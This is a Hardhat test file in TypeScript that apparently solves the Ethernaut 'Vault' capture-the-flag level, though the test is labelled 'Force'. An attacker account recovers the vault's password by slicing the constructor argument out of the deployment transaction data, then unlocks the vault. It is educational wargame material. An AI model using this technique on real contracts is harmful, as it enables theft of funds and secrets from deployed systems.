import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Vault } from "typechain-types";

// Challenge description
// Unlock the vault to pass the level!

describe("Ethernaut - Force", async () => {
  let vault: Vault;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    const password = ethers.utils.formatBytes32String("Secret123");
    const vaultFactory = await ethers.getContractFactory("Vault", owner);
    vault = await vaultFactory.deploy(password);
  });

  it("Hacks", async () => {
    expect(await vault.locked()).equal(true);

    // Get Contract creation Input Data (should be found on etherscan)
    const deployInputData = vault.deployTransaction.data;

    const vaultFactory = await ethers.getContractFactory("Vault");

    // get rid of bytecode and obtain passed constructor argument
    const passwordFromInputData = ethers.utils.hexDataSlice(
      deployInputData,
      vaultFactory.bytecode.length / 2 - 1,
    );

    await vault.connect(attacker).unlock(passwordFromInputData);

    expect(await vault.locked()).equal(false);
  });
});
